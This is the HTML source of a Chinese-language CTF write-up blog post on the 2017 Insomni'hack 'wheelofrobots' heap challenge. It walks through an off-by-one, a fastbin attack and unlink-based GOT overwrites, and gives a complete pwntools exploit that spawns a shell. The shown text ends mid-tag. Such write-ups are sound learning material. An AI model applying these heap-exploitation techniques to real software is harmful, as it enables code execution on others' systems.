@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;unlink&#x2F;2017_insomni&#39;hack_wheelofrobots grxer@Ubuntu16 ~&#x2F;D&#x2F;p&#x2F;heap&gt; checksec wheelofrobots[*] &amp;#x27;&#x2F;home&#x2F;grxer&#x2F;Desktop&#x2F;pwn&#x2F;heap&#x2F;wh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017 insomni&#39;hack wheelofrobots">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;unlink&#x2F;2017_insomni&#39;hack_wheelofrobots grxer@Ubuntu16 ~&#x2F;D&#x2F;p&#x2F;heap&gt; checksec wheelofrobots[*] &amp;#x27;&#x2F;home&#x2F;grxer&#x2F;Desktop&#x2F;pwn&#x2F;heap&#x2F;wh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317002742295.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317005523642.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317003427076.png">
+<meta property="article:published_time" content="2023-03-16T13:05:33.000Z">
+<meta property="article:modified_time" content="2023-03-29T16:39:13.131Z">
+<meta property="article:author" content="bxz">
+<meta property="article:tag" content="Unlink">
+<meta property="article:tag" content="Fastbin Attach">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2017 insomni&#39;hack wheelofrobots</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/17/2014-hack-lu-oreo/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/15/2016-ZCTF-note2-and-note3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&text=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&is_video=false&description=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2017 insomni&#39;hack wheelofrobots&body=Check out this article: https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&name=2017 insomni&#39;hack wheelofrobots&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&t=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attach%E4%BB%BB%E6%84%8F%E9%95%BF%E5%BA%A6%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">fastbin attach任意长度堆溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0unlink"><span class="toc-number">2.</span> <span class="toc-text">构造unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E5%8A%9E%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">老办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%8A%9E%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">新办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2017 insomni&#39;hack wheelofrobots
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-16T13:05:33.000Z" itemprop="datePublished">2023-03-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Fastbin-Attach/" rel="tag">Fastbin Attach</a>, <a class="tag-link-link" href="/tags/Unlink/" rel="tag">Unlink</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni'hack_wheelofrobots">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni&#39;hack_wheelofrobots</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec wheelofrobots</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/wheelofrobots&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>robots指针地址</p>
+<p>0x6030e0	- robot 4<br>0x6030e8	- robot 6<br>0x6030f0	- robot 2<br>0x6030f8	- robot 1<br>0x603100	- robot 3<br>0x603108	- robot 5</p>
+<p>大小</p>
+<p>0x603138	- robot 2<br>0x603140	- robot 3<br>0x603148	- robot 6</p>
+<p>程序add()里num &#x3D; read_num((char *)&amp;choice, 5uLL);存在off by one漏洞，会覆盖掉robots 2的inuse位，一切的一切都从这里开始</p>
+<h3 id="fastbin-attach任意长度堆溢出"><a href="#fastbin-attach任意长度堆溢出" class="headerlink" title="fastbin attach任意长度堆溢出"></a>fastbin attach任意长度堆溢出</h3><p>我们申请到robots2，大小控制到fastbin，0x20把，然后free掉这个chunk</p>
+<p>这个时候fast bin0x20出现这个chunk指针，我们可以通过offbyone，重新使用这个堆，这个时候往这个chunk里面写入值，robots2+0x10已经不是原来的user data，而是fd指针，我们把他改为一个伪造的free chunk地址，申请0x20堆块的第二次，就可以申请到这个伪造chunk，那就可以实现地址读写，但是要绕过，fastbin 的size&#x3D;0x21检测，伪造的free chunk+0x8需要&#x3D;0x21，我们观察程序选择到0x603138，因为robots3，size是可控为0x21的，</p>
+<p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png" alt="image-20230316234451675"></p>
+<p>我们拿到0x603138这个chunk后，会往0x603138+0x10&#x3D;0x603148,即robot 6的size写入值，就可以实现任意大小堆溢出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h3><p>常规构造,不多bb</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p>0x6030E8，地址写入0x6030D0</p>
+<h3 id="老办法"><a href="#老办法" class="headerlink" title="老办法"></a>老办法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317002742295.png" alt="image-20230317002742295"></p>
+<p>2 6 1可用  puts free atoi</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">change(<span class="number">6</span>,p64(puts_plt))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">change(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;oice : &#x27;</span>,<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="新办法"><a href="#新办法" class="headerlink" title="新办法"></a>新办法</h3><p>我们先</p>
+<p>payload &#x3D; p64(0)*2 + b’a’*0x18 + p64(0x6030e8)<br>change(6,payload)</p>
+<p>把1的指针指向6，这样就可以写一个通用函数去修改</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br></pre></td></tr></table></figure>
+
+<p>我们去利用start_robot打印出地址，由于打印结束后会exit，我们需要先hook掉这个exitgot，改为leave ret或ret即可</p>
+<p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317005523642.png" alt="image-20230317005523642"></p>
+<p>然后去修改got即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317003427076.png" alt="image-20230317003427076"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./wheelofrobots&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset_bin_main_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *0x004014B8&#x27;)#change 2</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401314&#x27;)#remove 3</span></span><br><span class="line">db(<span class="string">&#x27;b *0x401725&#x27;</span>)<span class="comment">#exit</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># first way++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># overflow_benderinuse(b&#x27;\x01&#x27;)</span></span><br><span class="line"><span class="comment"># payload = p64(0)*3+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span></span><br><span class="line"><span class="comment"># change(6,payload)</span></span><br><span class="line"><span class="comment"># change(6,p64(puts_plt))</span></span><br><span class="line"><span class="comment"># remove(2)</span></span><br><span class="line"><span class="comment"># puts_ad=u64(r(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># p(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># base=puts_ad-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># system=libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line"><span class="comment"># change(1,p64(system))</span></span><br><span class="line"><span class="comment"># sla(b&#x27;oice : &#x27;,b&#x27;sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># second way+++++++++++++++++++</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span 